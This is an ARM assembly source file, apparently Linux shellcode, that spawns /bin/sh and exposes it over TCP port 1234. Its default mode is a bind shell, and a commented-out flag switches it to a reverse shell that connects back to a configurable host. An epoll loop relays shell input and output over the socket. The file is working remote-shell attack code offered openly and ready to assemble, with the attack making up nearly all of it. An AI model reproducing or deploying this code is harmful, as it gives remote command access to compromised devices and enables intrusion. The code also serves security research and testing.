 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
    .arm
    .arch armv7-a

    // default TCP port
    .equ PORT, 1234 

    // default host, 127.0.0.1
    .equ HOST, 0x0100007F
    
    // comment out for a reverse connecting shell
    .equ BIND, 1

    // comment out for code to behave as a function
    .equ EXIT, 1

    .include "include.inc"

    // structure for stack variables

          .struct 0
    p_in: .skip 8
          .equ in0, p_in + 0
          .equ in1, p_in + 4
      
    p_out:.skip 8
          .equ out0, p_out + 0
          .equ out1, p_out + 4
      
    pid:  .skip 4
    s:    .skip 4

    .ifdef BIND
    s2:   .skip 4
    .endif

    efd:  .skip 4
    evts: .skip 16
          .equ events, evts + 0
          .equ data_fd,evts + 8
      
    buf:  .skip BUFSIZ
    ds_tbl_size:

    .global _start
    .text
_start:
    // save all registers
    push   {r0-r12, lr}

    // allocate memory for variables
    sub     sp, #ds_tbl_size

    // create pipes for stdin
    mov     r7, #SYS_pipe
    add     r0, sp, #p_in
    svc     0

    // create pipes for stdout + stderr
    add     r0, sp, #p_out
    svc     0

    // fork a separate instance for shell
    mov     r7, #SYS_fork
    svc     0
    str     r0, [sp, #pid]   // save pid
    cmp     r0, #0           // already forked?
    bne     opn_con          

    // in this order..
    //
    // dup2 (out[1], STDERR_FILENO)      
    // dup2 (out[1], STDOUT_FILENO)
    // dup2 (in[0],  STDIN_FILENO )
    mov     r7, #SYS_dup2
    mov     r1, #(STDERR_FILENO + 1)       
c_dup:
    subs    r1, #1
    ldrne   r0, [sp, #out1]
    ldreq   r0, [sp, #in0]
    svc     0
    bne     c_dup

    // close pipe handles in this order..
    //
    // close(in[0]);
    // close(in[1]);
    // close(out[0]);
    // close(out[1]);
    mov     r1, #3
    mov     r7, #SYS_close
cls_pipe:
    ldr     r0, [sp, r1, lsl #2]
    svc     0
    subs    r1, #1
    bpl     cls_pipe

    // execve("/bin/sh", NULL, NULL);
    ldr     r0, =#0x6e69622f // /bin
    ldr     r1, =#0x68732f2f // //sh
    eor     r2, r2
    push    {r0, r1, r2}
    eor     r1, r1    
    mov     r0, sp
    mov     r7, #SYS_execve
    svc     0

opn_con:
    // close(in[0]);
    mov     r7, #SYS_close
    ldr     r0, [sp, #in0]    
    svc     0

    // close(out[1]);
    ldr     r0, [sp, #out1]    
    svc     0

    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    movw    r7, #SYS_socket
    mov     r2, #IPPROTO_IP
    mov     r1, #SOCK_STREAM
    mov     r0, #AF_INET
    svc     0

    str     r0, [sp, #s]

    ldr     r3, =#0xD2040002 // htons(1234), AF_INET
        
    .ifdef BIND
      eor   r4, r4           // sa.sin_addr=INADDR_ANY
    .else
      ldr   r4, =#0x0100007f // sa.sin_addr=127.0.0.1
    .endif

    mov     r2, #16  // sizeof(sa)
    push    {r3, r4} // sa parameters
    mov     r1, sp   // r1 = &sa
.ifdef BIND  
    // bind (s, &sa, sizeof(sa));   
    movw    r7, #SYS_bind
    svc     0
    pop     {r3, r4}
    tst     r0, r0
    bne     cls_sck        // if(r0 != 0) goto cls_sck

    // listen (s, 1);
    mov     r7, #SYS_listen
    mov     r1, #1
    ldr     r0, [sp, #s]
    svc     0

    // accept (s, 0, 0);
    movw    r7, #SYS_accept
    eor     r2, r2
    eor     r1, r1
    ldr     r0, [sp, #s]
    svc     0

    ldr     r1, [sp, #s]      // load binding socket
    str     r0, [sp, #s]      // save peer socket as s
    str     r1, [sp, #s2]     // save binding socket as s2
.else
    // connect (s, &sa, sizeof(sa)); 
    movw    r7, #SYS_connect
    svc     0  
    pop     {r3, r4}       // release &sa
    tst     r0, r0
    bne     cls_sck        // if(r0 != 0) goto cls_sck
.endif 
    // efd = epoll_create1(0);
    movw    r7, #SYS_epoll_create1
    eor     r0, r0
    svc     0
    str     r0, [sp, #efd]

    ldr     r2, [sp, #s]
    ldr     r4, [sp, #out0]
poll_init:
    // epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
    mov     r7, #SYS_epoll_ctl
    mov     r3, #EPOLLIN
    str     r3, [sp, #events]   // evts.events  = EPOLLIN
    str     r2, [sp, #data_fd]  
    add     r3, sp, #evts       // r3 = &evts
    mov     r1, #EPOLL_CTL_ADD  // r1 = EPOLL_CTL_ADD
    ldr     r0, [sp, #efd]      // r0 = efd
    svc     0
    cmp     r2, r4              // if (r2 != out0) r2 = out0
    mov     r2, r4
    bne     poll_init           // loop twice
    // now loop until user exits or some other error      
poll_wait:
    // epoll_wait(efd, &evts, 1, -1);
    mov     r7, #SYS_epoll_wait
    mvn     r3, #0
    mov     r2, #1
    add     r1, sp, #evts
    ldr     r0, [sp, #efd]
    svc     0

    // if (r <= 0) break;
    tst     r0, r0
    ble     cls_efd

    // if (!(evts.events & EPOLLIN)) break;
    ldr     r0, [sp, #events]
    tst     r0, #EPOLLIN
    beq     cls_efd

    ldr     r0, [sp, #data_fd]
    ldr     r3, [sp, #s]
    cmp     r0, r3

    // r = (fd == s) ? s : out[0];
    ldrne   r0, [sp, #out0]
    // w = (fd == s) ? in[1] : s;
    ldreq   r3, [sp, #in1]

    // read(r, buf, BUFSIZ);
    mov     r7, #SYS_read
    mov     r2, #BUFSIZ
    add     r1, sp, #buf
    svc     0

    tst     r0, r0
    beq     cls_efd
    
    // encrypt/decrypt buffer

    // write(w, buf, len);
    mov     r7, #SYS_write
    mov     r2, r0
    mov     r0, r3
    svc     0
    b       poll_wait
cls_efd:   
    // epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
    mov     r7, #SYS_epoll_ctl
    mov     r3, #NULL
    ldr     r2, [sp, #s]
    mov     r1, #EPOLL_CTL_DEL
    ldr     r0, [sp, #efd]
    svc     0

    // epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
    ldr     r2, [sp, #out0]
    ldr     r0, [sp, #efd]
    svc     0

    // close(efd);
    mov     r7, #SYS_close
    ldr     r0, [sp, #efd]
    svc     0

    // shutdown(s, SHUT_RDWR);
    movw    r7, #SYS_shutdown
    mov     r1, #SHUT_RDWR
    ldr     r0, [sp, #s]
    svc     0
cls_sck:
    // close(s);
    mov     r7, #SYS_close
    ldr     r0, [sp, #s]
    svc     0
    
.ifdef BIND
    // close(s2);
    mov     r7, #SYS_close
    ldr     r0, [sp, #s2]
    svc     0
.endif            
    // kill(pid, SIGCHLD);
    mov     r7, #SYS_kill
    mov     r1, #SIGCHLD
    ldr     r0, [sp, #pid]
    svc     0

    // close(in[1]);
    mov     r7, #SYS_close
    ldr     r0, [sp, #in1]
    svc     0  

    // close(out[0]);
    mov     r7, #SYS_close
    ldr     r0, [sp, #out0]
    svc     0
      
.ifdef EXIT
    // exit(0);
    mov     r7, #SYS_exit
    svc     0 
.else
    // deallocate stack
    add     sp, #ds_tbl_size

    // restore registers and return
    pop     {r0-r12, pc}
.endif
